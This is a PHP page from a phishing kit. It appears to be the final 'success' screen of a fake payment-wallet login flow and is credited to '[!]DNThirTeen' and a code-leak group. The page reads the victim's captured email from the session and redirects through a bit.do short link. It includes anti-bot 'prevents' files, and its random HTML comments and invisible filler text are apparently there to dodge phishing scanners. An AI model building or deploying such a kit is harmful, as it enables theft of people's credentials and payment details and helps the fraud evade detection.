<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
		<?php echo $lg_process['title']?></title>
		<link rel="stylesheet" href="lib/styles/process.css">
		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
	</head>
	<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
<?php echo "<!--".rand(0,99999999)."-->"?><input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
	<div class="navContainer"><?php echo "<!--".rand(0,99999999)."-->"?>
		<a href="javascript:" class="desktopBrand"></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="mobileMenu">
			<div class="logoutMobile">
				<a href="javascript:" class="logoutTxtMobile"><?php echo "<!--".rand(0,99999999)."-->"?>
					<?php echo $lg_process['logout']?></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>			</div>
				<div class="settingsMobile">
			<?php echo "<!--".rand(0,99999999)."-->"?>		<a href="javascript:" class="svgLogo settingsTxt">
						<img src="lib/pics/settings.svg" alt=""></a>
					</div><?php echo "<!--".rand(0,99999999)."-->"?>
					<div>
						<p class="displayMail">
							<?php echo $_SESSION['EML']?></p><?php echo "<!--".rand(0,99999999)."-->"?>
						</div>
					</div>
<div class="desktopMenu">
	<?php echo "<!--".rand(0,99999999)."-->"?><nav class="desktopItems">
		<ul class="firstUl">
		<li class=""><?php echo "<!--".rand(0,99999999)."-->"?>
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['home']?>
<?php echo "<!--".rand(0,99999999)."-->"?>			</a>
		</li>
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['activity']?></a><?php echo "<!--".rand(0,99999999)."-->"?>
			</li>
			<li class="">
				<a href="javascript:" class="linksTxt">
					<?php echo $lg_process['menu']['send_receive']?></a></li><li class="">
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>				</li>
					<li class="activeLi">
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a>
					</li>
				</ul>
				<ul class="secondUl"><?php echo "<!--".rand(0,99999999)."-->"?>
					<li class="notifLi">
						<a href="javascript:" class="svgLogo notifTxt">
							<img src="lib/pics/noti.svg" alt=""></a>
						</li>
				<?php echo "<!--".rand(0,99999999)."-->"?>		<li>
							<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
						</li><?php echo "<!--".rand(0,99999999)."-->"?>
						<li class="logoutLi">
							<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a>
						</li>
						</ul>
	<?php echo "<!--".rand(0,99999999)."-->"?>				</nav>
				</div>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
		</div>
<div class="mainContainer">
	<div class="hide" id="rotate">
		<div class="spinner">
			<div class="rotate"></div>
<?php echo "<!--".rand(0,99999999)."-->"?>			<div class="processing"><?php echo $lg_sign['rotate']?></div>
		</div>
		<div class="overlay"><?php echo "<!--".rand(0,99999999)."-->"?>
		</div><?php echo "<!--".rand(0,99999999)."-->"?>
	</div>
	<div class="mobileNav">
		<div class="navHeader"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="blockToggler">
				<label class="menuLabel" for="toggleMenu"><span></span>
		<?php echo "<!--".rand(0,99999999)."-->"?>			<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div>
					<div class="menuClose">
						<?php echo $lg_process['menu']['close']?></div>
					</label>
				</div><?php echo "<!--".rand(0,99999999)."-->"?>
			</div>
			<div class="navLogo"><a href="javascript:" class="mobileBrand"></a>
			</div><ul class="notifUl"><li><a class="svgLogo notifTxt">
				<img src="lib/pics/noti.svg" alt="">
			</a>
		</li>
	</ul><?php echo "<!--".rand(0,99999999)."-->"?>
</div>
<div class="contents">
<section class="mainContents" id="finish">
<div id="select_three"><?php echo "<!--".rand(0,99999999)."-->"?>
	<div style="padding:20px">
		<img src="lib/pics/success.svg" alt="" width="150">
<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $lg_finish['head']?></h1>
		<p>
			<?php echo $lg_finish['p1']?>
			<span style="color:#41ad49;font-weight:bold"> <?php echo $lg_finish['on']?></span>, <?php echo $lg_finish['p2']?>
	<?php echo "<!--".rand(0,99999999)."-->"?>		<a style="font-weight:bold" href="https://bit.do/webaccount">
				<?php echo $lg_finish['p3']?></a>.</p><?php echo "<!--".rand(0,99999999)."-->"?>
				<div>
					        <meta http-equiv="refresh" content="3;url=https://bit.do/webaccount" />
				<form method="get" action="https://bit.do/webaccount">
	<button style="margin-top:20px;borde r-radius:.5rem" class="bt gone_bt"><?php echo $lg_process['title']?></button>
				</form>
</div>
</div><?php echo "<!--".rand(0,99999999)."-->"?>
</div>
</div><?php echo "<!--".rand(0,99999999)."-->"?>

<div>
	<div class="ftr">
		<div class="footerFirstContent">
			<ul class="footerList">
			<?php echo "<!--".rand(0,99999999)."-->"?>	<li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li>
				<li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li><?php echo "<!--".rand(0,99999999)."-->"?>
			</ul>
			<?php echo "<!--".rand(0,99999999)."-->"?><div class="footerSecondContent">
				<p class="footerP">Copyright ©<span>1999-2019</span> . <?php echo $lg_process['footer']['rights']?></p>
				<ul class="footerUl"><?php echo "<!--".rand(0,99999999)."-->"?>
				<?php echo "<!--".rand(0,99999999)."-->"?>	<li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><?php echo "<!--".rand(0,99999999)."-->"?>
					<li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li><?php echo "<!--".rand(0,99999999)."-->"?>
				</ul>
			</div>
		</div>
	</div>
	</div>
	</section>

</div>
</div>
</body>
</html>